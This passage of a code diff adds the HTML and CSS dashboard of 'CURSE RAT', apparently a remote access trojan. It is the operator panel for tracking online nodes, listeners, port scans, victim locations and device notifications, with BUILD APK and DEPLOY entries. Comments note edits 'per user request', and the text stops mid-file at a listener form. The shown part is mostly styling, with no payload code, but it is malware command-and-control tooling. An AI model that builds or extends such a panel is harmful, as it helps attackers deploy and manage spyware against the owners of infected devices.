@@ -1,0 +1,1355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CURSE RAT — Network Dashboard</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --red: #cc0000;
+    --red-bright: #ff1a1a;
+    --red-dim: #7a0000;
+    --red-glow: rgba(204,0,0,0.4);
+    --bg: #000000;
+    --bg2: #0a0a0a;
+    --bg3: #111111;
+    --panel: rgba(10,0,0,0.85);
+    --border: rgba(180,0,0,0.5);
+    --text: #e8e8e8;
+    --text-dim: #888;
+    --green-ok: #00ff88;
+    --font-mono: 'Share Tech Mono', monospace;
+    --font-display: 'Orbitron', sans-serif;
+    --font-body: 'Rajdhani', sans-serif;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html, body {
+    width: 100%; height: 100%;
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--font-body);
+    overflow: hidden;
+    user-select: none;
+  }
+
+  /* ─── ANIMATED BACKGROUND ─── */
+  #bg-canvas {
+    position: fixed; inset: 0; z-index: 0;
+    pointer-events: none;
+  }
+
+  /* ─── SCANLINES ─── */
+  .scanlines {
+    position: fixed; inset: 0; z-index: 1; pointer-events: none;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent, transparent 2px,
+      rgba(0,0,0,0.08) 2px, rgba(0,0,0,0.08) 4px
+    );
+  }
+
+  /* ─── NOISE OVERLAY ─── */
+  .noise {
+    position: fixed; inset: 0; z-index: 2; pointer-events: none;
+    opacity: 0.03;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noise'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noise)'/%3E%3C/svg%3E");
+    background-size: 128px 128px;
+    animation: noise-anim 0.4s steps(1) infinite;
+  }
+  @keyframes noise-anim {
+    0%,100%{background-position:0 0} 10%{background-position:-5% -10%}
+    20%{background-position:-15% 5%} 30%{background-position:7% -25%}
+    40%{background-position:20% 25%} 50%{background-position:-25% 10%}
+    60%{background-position:15% 5%} 70%{background-position:0% 15%}
+    80%{background-position:25% 35%} 90%{background-position:-10% 10%}
+  }
+
+  /* ─── LAYOUT ─── */
+  #app {
+    position: relative; z-index: 10;
+    display: grid;
+    grid-template-columns: 72px 1fr;
+    grid-template-rows: 1fr;
+    height: 100vh; width: 100vw;
+  }
+
+  /* ─── SIDEBAR ─── */
+  #sidebar {
+    display: flex; flex-direction: column;
+    align-items: center;
+    padding: 8px 0;
+    background: rgba(5,0,0,0.95);
+    border-right: 1px solid var(--border);
+    position: relative; z-index: 20;
+    gap: 0;
+  }
+
+  /* CURSE RAT title */
+  #curse-title-wrap {
+    padding: 4px 0;
+    margin-bottom: 20px;
+    width: 100%;
+    display: flex;
+    justify-content: center;
+  }
+  #curse-title {
+    font-family: var(--font-display);
+    font-size: 13px;
+    font-weight: 900;
+    letter-spacing: 0;
+    color: var(--red-bright);
+    padding: 10px 8px;
+    text-align: center;
+    border: 1px solid var(--red-bright);
+    border-radius: 6px;
+    background: rgba(180,0,0,0.05);
+    box-shadow: 0 0 15px var(--red-glow), inset 0 0 10px rgba(204,0,0,0.1);
+    animation: glow-pulse 2s ease-in-out infinite;
+    text-shadow: 0 0 10px var(--red-bright), 0 0 20px var(--red-glow);
+    line-height: 1.3;
+    text-transform: uppercase;
+  }
+  @keyframes glow-pulse {
+    0%, 100% { 
+        box-shadow: 0 0 15px var(--red-glow), inset 0 0 10px rgba(204,0,0,0.1);
+        border-color: rgba(255,26,26,0.5);
+    }
+    50% { 
+        box-shadow: 0 0 25px var(--red-glow), inset 0 0 15px rgba(204,0,0,0.2);
+        border-color: rgba(255,26,26,1);
+    }
+  }
+
+  /* Sidebar nav buttons group */
+  .nav-group {
+    display: flex; flex-direction: column;
+    align-items: center; gap: 6px;
+    width: 100%;
+    padding: 0 8px;
+  }
+  .nav-spacer { flex: 1; }
+
+  .nav-btn {
+    width: 48px; height: 48px;
+    display: flex; align-items: center; justify-content: center;
+    background: rgba(20,0,0,0.6);
+    border: 1px solid rgba(150,0,0,0.4);
+    border-radius: 10px;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    position: relative;
+    color: #888;
+  }
+  .nav-btn:hover {
+    background: rgba(180,0,0,0.2);
+    border-color: var(--red-bright);
+    color: var(--red-bright);
+    box-shadow: 0 0 12px var(--red-glow), inset 0 0 8px rgba(204,0,0,0.1);
+    transform: translateX(2px);
+  }
+  .nav-btn.active {
+    background: rgba(180,0,0,0.25);
+    border-color: var(--red-bright);
+    color: var(--red-bright);
+    box-shadow: 0 0 16px var(--red-glow), inset 0 0 10px rgba(204,0,0,0.15);
+  }
+  .nav-btn.active::before {
+    content: '';
+    position: absolute; left: -9px; top: 50%;
+    transform: translateY(-50%);
+    width: 3px; height: 24px;
+    background: var(--red-bright);
+    border-radius: 0 2px 2px 0;
+    box-shadow: 0 0 8px var(--red-bright);
+  }
+  .nav-btn svg { width: 22px; height: 22px; fill: currentColor; }
+  .nav-btn .tooltip {
+    position: absolute; left: 60px;
+    background: rgba(10,0,0,0.95);
+    border: 1px solid var(--red-dim);
+    color: var(--text);
+    font-family: var(--font-mono);
+    font-size: 10px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    white-space: nowrap;
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.15s;
+    z-index: 100;
+    letter-spacing: 1px;
+  }
+  .nav-btn:hover .tooltip { opacity: 1; }
+
+  /* ─── MAIN CONTENT ─── */
+  #main {
+    display: grid;
+    grid-template-rows: auto 1fr;
+    overflow: hidden;
+    background: var(--bg);
+    position: relative; /* needed for iframe absolute overlay */
+  }
+
+  /* Home view fills grid normally */
+  #home-view {
+    display: contents;
+  }
+
+  /* ─── TOP STATS BAR ─── */
+  #stats-bar {
+    display: grid;
+    grid-template-columns: 1fr 1fr 1fr 1fr;
+    gap: 12px;
+    padding: 14px 16px;
+    background: rgba(5,0,0,0.9);
+    border-bottom: 1px solid var(--border);
+  }
+
+.stat-card {
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 12px 16px;
+    position: relative;
+    overflow: visible; /* changed from hidden — was clipping port dropdown */
+    animation: card-appear 0.6s ease both;
+  }
+  @keyframes card-appear {
+    from{opacity:0;transform:translateY(-10px)}
+    to{opacity:1;transform:translateY(0)}
+  }
+  .stat-card::before {
+    content: '';
+    position: absolute; top: 0; left: 0; right: 0; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--red-bright), transparent);
+    animation: scan-line 3s ease-in-out infinite;
+  }
+  @keyframes scan-line {
+    0%{opacity:0.3}50%{opacity:1}100%{opacity:0.3}
+  }
+  .stat-card-header {
+    display: flex; align-items: center; justify-content: space-between;
+    margin-bottom: 10px;
+  }
+  .stat-label {
+    font-family: var(--font-display);
+    font-size: 10px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    color: var(--red-bright);
+    text-shadow: 0 0 8px var(--red-glow);
+  }
+  .stat-icon { color: var(--red-dim); opacity: 0.8; }
+  .stat-icon svg { width: 18px; height: 18px; fill: currentColor; }
+  .stat-value {
+    font-family: var(--font-mono);
+    font-size: 13px;
+    color: var(--text);
+    line-height: 1.8;
+  }
+  .stat-value span { color: var(--red-bright); font-weight: bold; }
+  .stat-value .blink { animation: blink 1.2s step-end infinite; }
+  @keyframes blink {0%,100%{opacity:1}50%{opacity:0}}
+
+  /* Location card special */
+  .location-card .location-list {
+    display: flex; flex-direction: column; gap: 4px;
+  }
+  .location-item {
+    display: flex; align-items: center; gap: 8px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--text-dim);
+    padding: 2px 0;
+  }
+  .location-item .loc-dot {
+    width: 6px; height: 6px; border-radius: 50%;
+    background: var(--red-bright);
+    box-shadow: 0 0 6px var(--red-bright);
+    animation: dot-pulse 2s ease-in-out infinite;
+    flex-shrink: 0;
+  }
+  @keyframes dot-pulse {
+    0%,100%{opacity:1;transform:scale(1)}
+    50%{opacity:0.4;transform:scale(0.6)}
+  }
+  .location-item .loc-name { color: var(--text); }
+
+  /* ─── DASHBOARD BODY ─── */
+  /* [CHANGED] Was 3-column (left-notif | globe | calls), now 2-column (globe | notif) */
+  #dash-body {
+    display: grid;
+    grid-template-columns: 1fr 280px;
+    gap: 0;
+    overflow: hidden;
+    height: 100%;
+  }
+
+  /* Panels */
+  .side-panel {
+    background: rgba(5,0,0,0.7);
+    border-right: 1px solid var(--border);
+    display: flex; flex-direction: column;
+    overflow: hidden;
+  }
+  .side-panel:last-child { border-right: none; border-left: 1px solid var(--border); }
+
+  .panel-title {
+    font-family: var(--font-display);
+    font-size: 9px;
+    letter-spacing: 4px;
+    color: var(--red-bright);
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    background: rgba(180,0,0,0.08);
+    text-shadow: 0 0 8px var(--red-glow);
+    display: flex; align-items: center; gap: 8px;
+  }
+  .panel-title::before {
+    content: '//';
+    color: var(--red-dim);
+    font-size: 10px;
+  }
+
+  .notif-list {
+    flex: 1; overflow-y: auto; padding: 8px 0;
+  }
+  .notif-list::-webkit-scrollbar { width: 3px; }
+  .notif-list::-webkit-scrollbar-thumb { background: var(--red-dim); }
+  .notif-list::-webkit-scrollbar-track { background: transparent; }
+
+  .notif-item {
+    padding: 8px 16px;
+    border-bottom: 1px solid rgba(150,0,0,0.1);
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    animation: notif-in 0.4s ease both;
+    cursor: default;
+    transition: background 0.15s;
+  }
+  .notif-item:hover { background: rgba(150,0,0,0.08); }
+  @keyframes notif-in {
+    from{opacity:0;transform:translateX(-10px)}
+    to{opacity:1;transform:translateX(0)}
+  }
+  .notif-time { color: var(--red-dim); font-size: 9px; margin-bottom: 2px; }
+  .notif-msg { color: var(--text); }
+  .notif-msg.warn { color: #ffaa00; }
+  .notif-msg.ok { color: var(--green-ok); }
+  .notif-msg.err { color: var(--red-bright); }
+
+  /* calls panel */
+  .call-item {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(150,0,0,0.1);
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    display: flex; align-items: center; gap: 10px;
+    cursor: default;
+    transition: background 0.15s;
+  }
+  .call-item:hover { background: rgba(150,0,0,0.08); }
+  .call-flag { font-size: 16px; }
+  .call-info { flex: 1; }
+  .call-country { color: var(--text); font-size: 11px; }
+  .call-ip { color: var(--red-dim); font-size: 9px; }
+  .call-status {
+    font-size: 9px; padding: 2px 6px; border-radius: 3px;
+    background: rgba(0,255,136,0.1); color: var(--green-ok);
+    border: 1px solid rgba(0,255,136,0.3);
+  }
+  .call-status.pending {
+    background: rgba(255,170,0,0.1); color: #ffaa00;
+    border-color: rgba(255,170,0,0.3);
+  }
+
+  /* ─── CENTER GLOBE ─── */
+  #globe-container {
+    display: flex; flex-direction: column;
+    align-items: center; justify-content: center;
+    position: relative;
+    background: radial-gradient(ellipse at center, rgba(60,0,0,0.3) 0%, transparent 70%);
+    overflow: hidden;
+  }
+
+  #globe-wrapper {
+    position: relative;
+    width: 420px; height: 420px;
+  }
+
+  #globe-canvas {
+    width: 420px; height: 420px;
+    border-radius: 50%;
+    display: block;
+  }
+
+  /* Glow ring around globe */
+  .globe-ring {
+    position: absolute; inset: -8px;
+    border-radius: 50%;
+    border: 1px solid rgba(204,0,0,0.3);
+    box-shadow: 0 0 40px rgba(204,0,0,0.15), inset 0 0 40px rgba(204,0,0,0.05);
+    pointer-events: none;
+    animation: ring-pulse 4s ease-in-out infinite;
+  }
+  @keyframes ring-pulse {
+    0%,100%{box-shadow:0 0 40px rgba(204,0,0,0.15),inset 0 0 40px rgba(204,0,0,0.05)}
+    50%{box-shadow:0 0 60px rgba(204,0,0,0.3),inset 0 0 60px rgba(204,0,0,0.1)}
+  }
+  .globe-ring-2 {
+    position: absolute; inset: -20px;
+    border-radius: 50%;
+    border: 1px solid rgba(204,0,0,0.1);
+    pointer-events: none;
+    animation: ring-pulse2 6s ease-in-out infinite;
+  }
+  @keyframes ring-pulse2 {
+    0%,100%{transform:scale(1);opacity:0.5}
+    50%{transform:scale(1.03);opacity:1}
+  }
+
+  /* Hover country tooltip */
+  #country-tooltip {
+    position: absolute;
+    background: rgba(5,0,0,0.95);
+    border: 1px solid var(--red-bright);
+    border-radius: 6px;
+    padding: 6px 12px;
+    font-family: var(--font-mono);
+    font-size: 11px;
+    color: var(--red-bright);
+    pointer-events: none;
+    opacity: 0;
+    transition: opacity 0.15s;
+    z-index: 100;
+    text-shadow: 0 0 8px var(--red-glow);
+    white-space: nowrap;
+  }
+
+  /* ─── BOTTOM ACTION BUTTONS ─── */
+  #bottom-actions {
+    display: flex; gap: 12px;
+    margin-top: 16px;
+  }
+  .action-btn {
+    width: 48px; height: 48px;
+    display: flex; align-items: center; justify-content: center;
+    background: rgba(20,0,0,0.8);
+    border: 1px solid rgba(150,0,0,0.5);
+    border-radius: 12px;
+    cursor: pointer;
+    color: var(--red-bright);
+    transition: all 0.2s ease;
+    position: relative;
+  }
+  .action-btn:hover {
+    background: rgba(180,0,0,0.25);
+    border-color: var(--red-bright);
+    box-shadow: 0 0 16px var(--red-glow);
+    transform: translateY(-2px);
+  }
+  .action-btn svg { width: 22px; height: 22px; fill: currentColor; }
+
+  /* ─── SCROLLBAR GLOBAL ─── */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-thumb { background: var(--red-dim); border-radius: 2px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+
+  /* ─── CORNER DECORATIONS ─── */
+  .corner-dec {
+    position: fixed; pointer-events: none; z-index: 5;
+    width: 40px; height: 40px;
+  }
+  .corner-dec.tl { top: 0; left: 72px; border-top: 2px solid var(--red-dim); border-left: 2px solid var(--red-dim); }
+  .corner-dec.tr { top: 0; right: 0; border-top: 2px solid var(--red-dim); border-right: 2px solid var(--red-dim); }
+  .corner-dec.bl { bottom: 0; left: 72px; border-bottom: 2px solid var(--red-dim); border-left: 2px solid var(--red-dim); }
+  .corner-dec.br { bottom: 0; right: 0; border-bottom: 2px solid var(--red-dim); border-right: 2px solid var(--red-dim); }
+
+  /* ─── STATUS BAR ─── */
+  #status-bar {
+    position: fixed; bottom: 0; left: 72px; right: 0;
+    height: 24px;
+    background: rgba(5,0,0,0.95);
+    border-top: 1px solid var(--border);
+    display: flex; align-items: center;
+    padding: 0 16px;
+    gap: 24px;
+    font-family: var(--font-mono);
+    font-size: 9px;
+    color: var(--red-dim);
+    z-index: 30;
+    letter-spacing: 1px;
+  }
+  .status-item { display: flex; align-items: center; gap: 6px; }
+  .status-dot {
+    width: 5px; height: 5px; border-radius: 50%;
+    background: var(--green-ok);
+    box-shadow: 0 0 6px var(--green-ok);
+    animation: dot-pulse 1.5s ease-in-out infinite;
+  }
+  .status-dot.red { background: var(--red-bright); box-shadow: 0 0 6px var(--red-bright); }
+  #clock {
+    margin-left: auto;
+    color: var(--red-bright);
+    font-size: 10px;
+    text-shadow: 0 0 8px var(--red-glow);
+  }
+  #status-bar .scroll-text {
+    overflow: hidden; white-space: nowrap;
+    flex: 1;
+  }
+  #scroll-inner {
+    display: inline-block;
+    animation: marquee 25s linear infinite;
+    color: rgba(180,0,0,0.6);
+    font-size: 9px;
+  }
+  @keyframes marquee {
+    from{transform:translateX(100%)}
+    to{transform:translateX(-100%)}
+  }
+
+  /* ─── TERMINAL LINES WIDGET ─── */
+  #terminal-widget {
+    margin-top: 16px;
+    width: 100%;
+    max-width: 420px;
+    background: rgba(0,5,0,0.8);
+    border: 1px solid rgba(0,100,0,0.4);
+    border-radius: 8px;
+    padding: 10px 14px;
+    font-family: var(--font-mono);
+    font-size: 10px;
+    color: #00cc55;
+    height: 80px;
+    overflow: hidden;
+    position: relative;
+  }
+  #terminal-widget::before {
+    content: '> CURSE_RAT_v3.0.0 — SYSTEM ACTIVE';
+    display: block;
+    color: #00ff88;
+    margin-bottom: 4px;
+  }
+  .term-line { color: #00aa44; opacity: 0.8; }
+  .term-line.active { color: #00ff88; opacity: 1; }
+  .term-cursor { display: inline-block; width: 7px; height: 11px; background: #00ff88; animation: blink 1s step-end infinite; vertical-align: text-bottom; }
+</style>
+</head>
+<body>
+
+<!-- Animated BG Canvas -->
+<canvas id="bg-canvas"></canvas>
+<div class="scanlines"></div>
+<div class="noise"></div>
+
+<!-- Corner decorations -->
+<div class="corner-dec tl"></div>
+<div class="corner-dec tr"></div>
+<div class="corner-dec bl"></div>
+<div class="corner-dec br"></div>
+
+<div id="app">
+
+  <!-- ═══ SIDEBAR ═══ -->
+  <div id="sidebar">
+    <!-- CURSE RAT title -->
+    <div id="curse-title-wrap">
+        <div id="curse-title">C<br>U<br>R<br>S<br>E<br><div style="height:6px"></div>R<br>A<br>T</div>
+    </div>
+
+    <!-- Top nav -->
+    <div class="nav-group">
+      <!-- Home -->
+      <div class="nav-btn active" id="btn-home">
+        <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+        <span class="tooltip">HOME</span>
+      </div>
+      <!-- Clients — loads clients.html in main iframe -->
+      <div class="nav-btn" id="btn-clients" onclick="navigateTo('clients')">
+        <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z"/></svg>
+        <span class="tooltip">CLIENTS</span>
+      </div>
+      <!-- [REMOVED] Network/WiFi button — was 3rd top button, removed per user request -->
+      <!--
+      <div class="nav-btn" id="btn-network">
+        <svg viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
+        <span class="tooltip">NETWORK</span>
+      </div>
+      -->
+      <!-- Logs — loads logs.html in main iframe -->
+      <div class="nav-btn" id="btn-logs" onclick="navigateTo('logs')">
+        <svg viewBox="0 0 24 24"><path d="M20 3H4v10c0 2.21 1.79 4 4 4h6c2.21 0 4-1.79 4-4v-3h2c1.11 0 2-.89 2-2V5c0-1.11-.89-2-2-2zm0 5h-2V5h2v3zM4 19h16v2H4z"/></svg>
+        <span class="tooltip">LOGS</span>
+      </div>
+    </div>
+
+    <div class="nav-spacer"></div>
+
+    <!-- Bottom nav -->
+    <div class="nav-group">
+      <!-- Add/Plus — loads build.html in main iframe (SPA, no page reload) -->
+      <div class="nav-btn" id="btn-add" onclick="navigateTo('build')">
+        <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+        <span class="tooltip">BUILD APK</span>
+      </div>
+      <!-- Thunder/Deploy — loads deploy.html in main iframe -->
+      <div class="nav-btn" id="btn-deploy" onclick="navigateTo('deploy')">
+        <svg viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+        <span class="tooltip">DEPLOY</span>
+      </div>
+      <!-- Settings — loads settings.html in main iframe -->
+      <div class="nav-btn" id="btn-settings" style="margin-bottom:8px" onclick="navigateTo('settings')">
+        <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+        <span class="tooltip">SETTINGS</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- ═══ MAIN ═══ -->
+  <!-- SPA wrapper: #home-view shows dashboard, #iframe-view shows sub-pages seamlessly -->
+  <div id="main">
+
+    <!-- ── HOME VIEW (default dashboard) ── -->
+    <div id="home-view">
+
+    <!-- Stats Bar -->
+    <div id="stats-bar">
+
+      <!-- Info Card -->
+      <div class="stat-card">
+        <div class="stat-card-header">
+          <span class="stat-label">SYSTEM</span>
+          <span class="stat-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
+          </span>
+        </div>
+        <div class="stat-value">
+          Nodes Online : <span id="online-count">0</span><br>
+          Listeners Active : <span id="port-count">0</span><br>
+          Scanning Ports : <span id="port-display" style="cursor:pointer; color:var(--red-bright)">NONE</span>
+        </div>
+      </div>
+
+      <!-- Sent -->
+      <div class="stat-card">
+        <div class="stat-card-header">
+          <span class="stat-label">SENT</span>
+          <span class="stat-icon">
+            <svg viewBox="0 0 24 24"><path d="M2.01 21L23 12 2.01 3 2 10l15 2-15 2z"/></svg>
+          </span>
+        </div>
+        <div class="stat-value">
+          Packets : <span id="sent-packets">0</span><br>
+          Bytes : <span id="sent-bytes">0 B</span><br>
+          Rate : <span id="sent-rate">0 B/s</span>
+        </div>
+      </div>
+
+      <!-- Received -->
+      <div class="stat-card">
+        <div class="stat-card-header">
+          <span class="stat-label">RECEIVED</span>
+          <span class="stat-icon">
+            <svg viewBox="0 0 24 24"><path d="M20 5.41L18.59 4 7 15.59V9H5v10h10v-2H8.41z"/></svg>
+          </span>
+        </div>
+        <div class="stat-value">
+          Packets : <span id="recv-packets">0</span><br>
+          Bytes : <span id="recv-bytes">0 B</span><br>
+          Rate : <span id="recv-rate">0 B/s</span>
+        </div>
+      </div>
+
+      <!-- Location -->
+      <div class="stat-card location-card">
+        <div class="stat-card-header">
+          <span class="stat-label">LOCATION</span>
+          <span class="stat-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+          </span>
+        </div>
+        <div class="location-list" id="location-list">
+          <div class="location-item"><div class="loc-dot"></div><span class="loc-name">—</span></div>
+          <div class="location-item"><div class="loc-dot" style="animation-delay:0.5s"></div><span class="loc-name">—</span></div>
+          <div class="location-item"><div class="loc-dot" style="animation-delay:1s"></div><span class="loc-name">—</span></div>
+        </div>
+      </div>
+
+    </div>
+
+    <!-- Dashboard Body -->
+    <!-- [CHANGED] Layout: left notifications panel REMOVED, globe is now center+left, notifications moved to RIGHT -->
+    <!-- [REMOVED] Recent Calls panel — was right side panel, removed per user request -->
+    <div id="dash-body">
+
+      <!-- [REMOVED] Left: Notifications panel — moved to right side per user request -->
+      <!--
+      <div class="side-panel" id="left-notif-panel">
+        <div class="panel-title">RECENT NOTIFICATIONS</div>
+        <div class="notif-list" id="notif-list-left">
+        </div>
+      </div>
+      -->
+
+      <!-- Center: Globe (now spans full left+center) -->
+      <div id="globe-container">
+        <div id="globe-wrapper">
+          <canvas id="globe-canvas" width="420" height="420"></canvas>
+          <div class="globe-ring"></div>
+          <div class="globe-ring-2"></div>
+          <div id="country-tooltip"></div>
+        </div>
+
+        <!-- [REMOVED] Bottom action buttons below globe — duplicates of sidebar, removed per user request -->
+        <!--
+        <div id="bottom-actions">
+          <div class="action-btn" title="New Connection">
+            <svg viewBox="0 0 24 24"><path d="M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"/></svg>
+          </div>
+          <div class="action-btn" title="Deploy">
+            <svg viewBox="0 0 24 24"><path d="M7 2v11h3v9l7-12h-4l4-8z"/></svg>
+          </div>
+          <div class="action-btn" title="Settings">
+            <svg viewBox="0 0 24 24"><path d="M19.14 12.94c.04-.3.06-.61.06-.94 0-.32-.02-.64-.07-.94l2.03-1.58c.18-.14.23-.41.12-.61l-1.92-3.32c-.12-.22-.37-.29-.59-.22l-2.39.96c-.5-.38-1.03-.7-1.62-.94l-.36-2.54c-.04-.24-.24-.41-.48-.41h-3.84c-.24 0-.43.17-.47.41l-.36 2.54c-.59.24-1.13.57-1.62.94l-2.39-.96c-.22-.08-.47 0-.59.22L2.74 8.87c-.12.21-.08.47.12.61l2.03 1.58c-.05.3-.09.63-.09.94s.02.64.07.94l-2.03 1.58c-.18.14-.23.41-.12.61l1.92 3.32c.12.22.37.29.59.22l2.39-.96c.5.38 1.03.7 1.62.94l.36 2.54c.05.24.24.41.48.41h3.84c.24 0 .44-.17.47-.41l.36-2.54c.59-.24 1.13-.56 1.62-.94l2.39.96c.22.08.47 0 .59-.22l1.92-3.32c.12-.22.07-.47-.12-.61l-2.01-1.58zM12 15.6c-1.98 0-3.6-1.62-3.6-3.6s1.62-3.6 3.6-3.6 3.6 1.62 3.6 3.6-1.62 3.6-3.6 3.6z"/></svg>
+          </div>
+        </div>
+        -->
+
+        <div id="terminal-widget" style="margin-top: 40px;">
+          <div id="term-lines"></div>
+          <span class="term-cursor"></span>
+        </div>
+        <div id="sys-info-box" style="margin-top: 15px; font-family: var(--font-mono); font-size: 10px; color: var(--red-bright); border: 1px solid var(--border); padding: 10px; border-radius: 8px; width: 420px; background: rgba(20,0,0,0.5); display: flex; justify-content: space-around; letter-spacing: 1px;">
+            <div>CPU: <span id="sys-cpu">--</span></div>
+            <div>RAM: <span id="sys-ram">--</span></div>
+            <div>UPTIME: <span id="sys-uptime">--</span></div>
+        </div>
+      </div>
+
+      <!-- [CHANGED] Right panel: was "Recent Calls", now "Recent Notifications" moved here per user request -->
+      <!-- [REMOVED] Recent Calls panel content — removed per user request -->
+      <div class="side-panel">
+        <div class="panel-title">
+            RECENT NOTIFICATIONS
+            <select id="notif-filter" style="margin-left:auto; background:#000; color:var(--red-bright); border:1px solid var(--border); font-size:9px; outline:none; cursor:pointer;">
+                <option value="all">ALL DEVICES</option>
+            </select>
+        </div>
+        <div class="notif-list" id="notif-list">
+          <!-- populated by JS -->
+        </div>
+      </div>
+
+    </div><!-- end #dash-body -->
+  </div><!-- end #home-view -->
+
+  <!-- ── IFRAME VIEW (sub-pages load here seamlessly — no new tab/popup) ── -->
+  <!-- [NEW] SPA iframe: clients, logs, new_connection, deploy, settings all load here -->
+  <iframe
+    id="iframe-view"
+    style="display:none; position:absolute; top:0; left:0; width:100%; height:100%; border:none; background:#000;"
+    src="about:blank"
+  ></iframe>
+
+</div><!-- end #main -->
+</div>
+
+<!-- Status Bar -->
+<div id="status-bar">
+  <div class="status-item"><div class="status-dot"></div> CONNECTED</div>
+  <div class="status-item"><div class="status-dot red"></div> <span id="threat-level">THREAT: LOW</span></div>
+  <div class="scroll-text"><span id="scroll-inner">[ CURSE RAT NETWORK NODE v3.0.0 ] — MONITORING ACTIVE — ALL SYSTEMS NOMINAL — ENCRYPTION: AES-256-GCM — TUNNEL: ESTABLISHED — LATENCY: 12ms — UPTIME: 99.97% — </span></div>
+  <div id="clock"></div>
+</div>
+
+<!-- PORT DROPDOWN — moved to body level so nothing clips or intercepts it -->
+<div id="port-dropdown" style="
+  display:none;
+  position:fixed;
+  background:#0a0000;
+  border:1px solid #cc0000;
+  border-radius:6px;
+  padding:14px;
+  z-index:99999;
+  min-width:200px;
+  box-shadow:0 8px 30px rgba(0,0,0,0.95);
+  font-family:'Share Tech Mono',monospace;
+">
+  <div style="font-size:9px;color:#7a0000;margin-bottom:10px;letter-spacing:1px;">[ ADD_NEW_LISTENER ]</div>
+  <div style="display:flex;gap:8px;margin-bottom:14px;align-items:center;">
+    <input
+      id="new-port-input"
+      type="number"
+      placeholder="PORT"
+      min="1" max="65535"
+      style="
+        width:90px;background:#000;color:#fff;
+        border:1px solid #cc0000;font-size:11px;
+        padding:6px 8px;border-radius:4px;
+        font-family:'Share Tech Mono',monospace;
+        outline:none;
+      "
+    >
+    <button id="add-port-btn" style="
+      background:rgba(180,0,0,0.3);
+      color:#ff1a1a;
+      border:1px solid #ff1a1a;
+      font-size:9px;cursor:pointer;
+      padding:6px 12px;border-radius:4px;
+      font-family:'Orbitron',sans-serif;
+      letter-spacing:1px;
+    ">START</button>
+  </div>
